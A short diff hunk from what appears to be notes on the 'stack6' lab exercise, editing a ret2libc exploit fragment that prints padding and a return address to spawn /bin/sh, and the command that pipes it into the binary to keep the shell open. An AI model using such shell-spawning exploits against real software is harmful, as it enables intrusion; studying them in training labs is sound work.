@@ -54,5 +54,5 @@ binsh = ***address of "bin/sh"***
 
 print padding+ret2libc+ret+binsh
 
-Note dont forget to execute like that: (python script ; cat) | ./stack6
+Note dont forget to execute like that: (python script.py ; cat) | ./stack6
 
